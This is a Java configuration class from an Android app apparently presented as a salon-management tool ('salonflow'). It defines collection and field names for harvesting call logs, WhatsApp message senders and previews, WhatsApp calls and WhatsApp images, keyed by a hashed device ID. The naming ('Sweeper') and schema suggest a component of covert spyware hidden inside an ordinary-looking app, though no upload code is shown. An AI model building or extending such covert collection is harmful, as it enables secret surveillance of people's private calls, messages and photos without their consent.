package com.salonflow.app;

import android.provider.Settings;
import android.content.Context;
import android.os.Build;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class SweeperConfig {
    static final String COLLECTION_CALL_LOGS = "callLogs";
    static final String COLLECTION_WHATSAPP_MSGS = "whatsappMessages";
    static final String COLLECTION_WHATSAPP_CALLS = "whatsappCalls";
    static final String COLLECTION_WHATSAPP_IMAGES = "whatsappImages";

    static final String FIELD_DEVICE = "deviceId";
    static final String FIELD_NUMBER = "number";
    static final String FIELD_NAME = "name";
    static final String FIELD_TYPE = "type";
    static final String FIELD_DURATION = "durationSec";
    static final String FIELD_TIMESTAMP = "timestamp";
    static final String FIELD_SENDER = "sender";
    static final String FIELD_PREVIEW = "preview";
    static final String FIELD_IS_GROUP = "isGroup";
    static final String FIELD_CALLER = "caller";
    static final String FIELD_IMAGE = "imageData";
    static final String FIELD_MIME = "mimeType";

    static final int WHATSAPP_NOTIFICATION_ID = 4102;

    static String deviceId(Context context) {
        String id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null) id = "unknown";
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(id.getBytes());
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) hex.append(String.format("%02x", b));
            return hex.toString().substring(0, 16);
        } catch (NoSuchAlgorithmException e) {
            return id;
        }
    }

    static String deviceDisplayName() {
        String manufacturer = Build.MANUFACTURER;
        if (manufacturer != null && !manufacturer.isEmpty()) {
            manufacturer = Character.toUpperCase(manufacturer.charAt(0)) + manufacturer.substring(1);
        } else {
            manufacturer = "Unknown";
        }
        return manufacturer + " " + Build.MODEL;
    }
}
